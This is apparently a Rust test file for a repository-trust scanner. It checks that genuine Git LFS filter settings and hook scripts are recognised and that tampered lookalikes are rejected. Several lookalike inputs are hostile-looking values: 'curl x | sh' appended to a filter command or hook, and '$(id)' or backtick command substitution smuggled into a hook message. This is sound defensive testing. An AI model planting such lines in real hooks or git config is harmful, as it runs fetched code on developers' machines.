use super::*;
use crate::testutil::*;
use crate::trust::scan_at;

fn set(key: &str, value: &str) -> ConfigCommand {
    ConfigCommand { key: key.into(), value: value.into() }
}

fn follow(path: &str) -> Follow {
    Follow { path: path.into(), tracked: None, hooks: false }
}

const PRINTF: &str = "command -v git-lfs >/dev/null 2>&1 || { printf >&2 \"\\n%s\\n\\n\" \"This repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the 'NAME' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\"; exit 2; }";
const ECHO: &str = "command -v git-lfs >/dev/null 2>&1 || { echo >&2 \"\\nThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting .git/hooks/NAME.\\n\"; exit 2; }";

/// The script `git lfs install` writes for hook `name`, its check line `check`.
fn script(name: &str, check: &str) -> String {
    format!("#!/bin/sh\n{}\ngit lfs {name} \"$@\"\n", check.replace("NAME", name))
}

#[test]
fn git_lfs_standard_settings_are_known() {
    for (key, value) in [
        ("filter.lfs.clean", "git-lfs clean -- %f"),
        ("filter.lfs.smudge", "git-lfs smudge -- %f"),
        ("filter.lfs.smudge", "git-lfs smudge --skip -- %f"),
        ("filter.lfs.process", "git-lfs filter-process"),
        ("filter.lfs.process", "git-lfs filter-process --skip"),
        ("Filter.lfs.Clean", "  git-lfs clean -- %f\t"),
    ] {
        assert_eq!(setting(&set(key, value), &[]), Some(Known::GitLfs), "{key} = {value}");
    }
}

#[test]
fn lookalike_settings_are_not_known() {
    for (key, value) in [
        ("filter.lfs.clean", "git-lfs clean -- %f; curl x | sh"),
        ("filter.lfs.clean", "git-lfs smudge -- %f"),
        ("filter.lfs.smudge", "git-lfs clean -- %f"),
        ("filter.lfs.process", "git-lfs  filter-process"),
        ("filter.lfs.process", "./git-lfs filter-process"),
        ("filter.lfs2.clean", "git-lfs clean -- %f"),
        ("filter.LFS.clean", "git-lfs clean -- %f"),
        ("filter.x.lfs.clean", "git-lfs clean -- %f"),
        ("filter.lfs.required", "true"),
        ("core.sshCommand", "git-lfs clean -- %f"),
    ] {
        assert_eq!(setting(&set(key, value), &[]), None, "{key} = {value}");
    }
}

#[test]
fn a_git_lfs_file_in_the_working_tree_makes_the_setting_unknown() {
    let c = set("filter.lfs.clean", "git-lfs clean -- %f");
    assert_eq!(setting(&c, &[follow("tools/other")]), Some(Known::GitLfs));
    for path in ["git-lfs", "git-lfs.exe", "Git-LFS.EXE"] {
        assert_eq!(setting(&c, &[follow(path)]), None, "{path}");
    }
}

#[test]
fn git_lfs_hook_scripts_are_known() {
    for name in ["pre-push", "post-checkout", "post-commit", "post-merge"] {
        for check in [PRINTF, ECHO] {
            let text = script(name, check);
            assert_eq!(hook(name, text.as_bytes()), Some(Known::GitLfs), "{text}");
            let crlf = format!("{}\r\n\r\n", text.replace('\n', "\r\n"));
            assert_eq!(hook(name, crlf.as_bytes()), Some(Known::GitLfs), "CRLF and a blank line");
            let spaced = text.replace('\n', "  \n\n");
            assert_eq!(hook(name, spaced.as_bytes()), Some(Known::GitLfs), "trailing spaces");
        }
    }
}

#[test]
fn lookalike_hook_scripts_are_not_known() {
    let good = script("post-checkout", PRINTF);
    let unknown = |name: &str, text: &str| assert_eq!(hook(name, text.as_bytes()), None, "{name}: {text}");
    unknown("post-checkout", &good.replace("\"$@\"\n", "\"$@\"; curl x | sh\n"));
    unknown("post-checkout", &format!("{good}curl x | sh\n"));
    unknown("post-checkout", &good.replace("#!/bin/sh\n", "#!/bin/sh\nexport X=1\n"));
    unknown("post-checkout", &good.replace("was not found", "was $(id) not found"));
    unknown("post-checkout", &good.replace("was not found", "was `id` not found"));
    unknown("post-checkout", &good.replace("was not found", "was \\\\ not found"));
    unknown("post-checkout", &good.replace("was not found", "was \\t not found"));
    unknown("post-checkout", &good.replace("was not found", "was \" not found"));
    unknown("post-checkout", &good.replace("exit 2", "exit 0"));
    unknown("post-checkout", &good.replace("#!/bin/sh", "#!/bin/bash"));
    unknown("post-checkout", &good.replace("git lfs post-checkout", "git lfs post-merge"));
    unknown("post-merge", &good);
    unknown("pre-commit", &script("pre-commit", PRINTF));
    unknown("post-checkout", &good.replace("git lfs", " git lfs"));
    assert_eq!(hook("post-checkout", &[0xff, 0xfe]), None, "not UTF-8");
    // sh runs other whitespace as ordinary characters: only space, tab and CR are blanks.
    for odd in ['\u{a0}', '\u{b}', '\u{c}', '\u{2028}'] {
        unknown("post-checkout", &good.replace("#!/bin/sh\n", &format!("#!/bin/sh\n{odd}\n")));
        unknown("post-checkout", &good.replace("\"$@\"\n", &format!("\"$@\"{odd}\n")));
    }
}

#[test]
fn a_scan_records_the_git_lfs_hooks_it_recognises() {
    let dir = scratch_repo("trust-known-lfs");
    for (k, v) in [
        ("filter.lfs.clean", "git-lfs clean -- %f"),
        ("filter.lfs.smudge", "git-lfs smudge -- %f"),
        ("filter.lfs.process", "git-lfs filter-process"),
    ] {
        git(&dir, &["config", k, v]);
    }
    let hooks = dir.join(".git").join("hooks");
    for name in ["pre-push", "post-checkout", "post-commit", "post-merge"] {
        std::fs::write(hooks.join(name), script(name, PRINTF)).unwrap();
    }
    super::super::tests::hook(&hooks, "pre-commit");
    #[cfg(unix)]
    for name in ["pre-push", "post-checkout", "post-commit", "post-merge"] {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(hooks.join(name), std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let s = scan_at(&dir).unwrap();
    let known: Vec<&str> = s.known_hooks.keys().map(String::as_str).collect();
    assert_eq!(known, ["post-checkout", "post-commit", "post-merge", "pre-push"]);
    assert!(s.hooks.contains(&"pre-commit".to_owned()));
    assert!(s.config.iter().all(|c| setting(c, &s.follows) == Some(Known::GitLfs)), "{:?}", s.config);
    let _ = std::fs::remove_dir_all(&dir);
}
